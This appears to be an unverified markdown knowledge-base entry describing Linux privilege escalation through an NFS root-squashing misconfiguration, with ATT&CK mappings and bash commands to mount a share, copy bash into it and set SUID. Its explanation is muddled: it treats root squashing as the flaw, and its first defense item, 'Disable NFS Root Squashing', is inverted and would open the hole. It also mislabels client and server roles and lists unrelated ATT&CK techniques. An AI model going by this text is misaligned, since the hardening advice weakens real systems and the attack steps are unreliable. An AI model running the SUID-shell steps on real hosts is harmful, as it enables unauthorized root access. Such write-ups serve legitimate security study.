---
id: 56f24c13-a207-4b9a-8d96-ed89f6b37529
name: Linux Privilege Escalation via NFS Root Squashing
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:19.334976+00:00'
updated_at: '2023-04-10T20:34:35.851143+00:00'
tactics:
- '[[Credential Access|TA0006 - Credential Access]]'
- '[[Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
- '[[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]'
- '[[Steal Application Access Token|T1528 - Steal Application Access Token]]'
tags:
- '[[Linux - Privilege Escalation]]'
- '[[NFS Root Squashing]]'
commands:
- '[[Copy shell]]'
- '[[Create directory]]'
- '[[Mount directory]]'
- '[[Read /etc/exports file]]'
- '[[Remote check for folder name]]'
- '[[Set suid permission]]'
---

# Linux Privilege Escalation via NFS Root Squashing

## Summary

Linux systems often use NFS to share files and directories between multiple machines. NFS Root Squashing is a feature that prevents NFS clients from accessing files owned by root on the NFS server. However, if a user on the NFS client machine has access to a directory that is owned by root on the N

## Description

# Description

Linux systems often use NFS to share files and directories between multiple machines. NFS Root Squashing is a feature that prevents NFS clients from accessing files owned by root on the NFS server. However, if a user on the NFS client machine has access to a directory that is owned by root on the NFS server, they can use this to escalate their privileges on the NFS client machine. The attacker can export a file on the NFS server that contains a malicious script or binary, mount the exported directory on the client machine, and then execute the script or binary with SUID permission to gain elevated privileges. This technique can be used to gain access to sensitive files or to execute commands with elevated privileges on the client machine.

 

## Requirements

1. Access to a directory owned by root on the NFS server

1. Ability to export a file on the NFS server

1. Ability to mount the exported directory on the client machine

1. Ability to set SUID permission on a script or binary

 

## Defense

1. Disable NFS Root Squashing to prevent attackers from exploiting this vulnerability

1. Ensure that file permissions on the NFS server are set appropriately to prevent unauthorized access

1. Monitor NFS activity for suspicious behavior

 

## Objectives

1. Gain elevated privileges on the NFS client machine

1. Access sensitive files on the NFS client machine

 

# Instructions

1. The exports file is used by NFS (Network File System) to determine which file systems to export to remote hosts. It contains a list of directories that are available for remote mounting and the access level that is granted to each remote system.

 



**Code**: [[/etc/exports]]



> This command simply provides the location of the exports file on the system, which is typically located at /etc/exports. This file can be edited to control which directories are exported and what level of access is granted to remote systems.



**Command** ([[Read /etc/exports file]]):

```bash
cat /etc/exports
```



2. Follow these instructions to mount an NFS directory and set SUID permission on bash shell:
1. Check the remote name of the folder using the command 'showmount -e 10.10.10.10'.
2. Create a directory using the command 'mkdir /tmp/nfsdir'.
3. Mount the directory using the command 'mount -t nfs 10.10.10.10:/shared /tmp/nfsdir'.
4. Navigate to the mounted directory using the command 'cd /tmp/nfsdir'.
5. Copy the desired shell using the command 'cp /bin/bash .'.
6. Set SUID permission on the bash shell using the command 'chmod +s bash'.

 



**Code**: [[# remote check the name of the folder
showmount -e]]



> The above commands are used to mount an NFS directory and set SUID permission on bash shell. The 'showmount' command is used to check the remote name of the folder. The 'mkdir' command is used to create a directory. The 'mount' command is used to mount the directory. The 'cd' command is used to navigate to the mounted directory. The 'cp' command is used to copy the desired shell. The 'chmod' command is used to set SUID permission on the bash shell.



**Command** ([[Remote check for folder name]]):

```bash
showmount -e 10.10.10.10
```





**Command** ([[Create directory]]):

```bash
mkdir /tmp/nfsdir
```





**Command** ([[Mount directory]]):

```bash
mount -t nfs 10.10.10.10:/shared /tmp/nfsdir
cd /tmp/nfsdir
```





**Command** ([[Copy shell]]):

```bash
cp /bin/bash .
```





**Command** ([[Set suid permission]]):

```bash
chmod +s bash
```



## MITRE ATT&CK Mapping

### Tactics

- [[Credential Access|TA0006 - Credential Access]]
- [[Privilege Escalation|TA0004 - Privilege Escalation]]

### Techniques

- [[Exploitation for Privilege Escalation|T1068 - Exploitation for Privilege Escalation]]
- [[Steal Application Access Token|T1528 - Steal Application Access Token]]

## Commands Used

- [[Copy shell]]
- [[Create directory]]
- [[Mount directory]]
- [[Read /etc/exports file]]
- [[Remote check for folder name]]
- [[Set suid permission]]

## Tags

- [[Linux - Privilege Escalation]]
- [[NFS Root Squashing]]


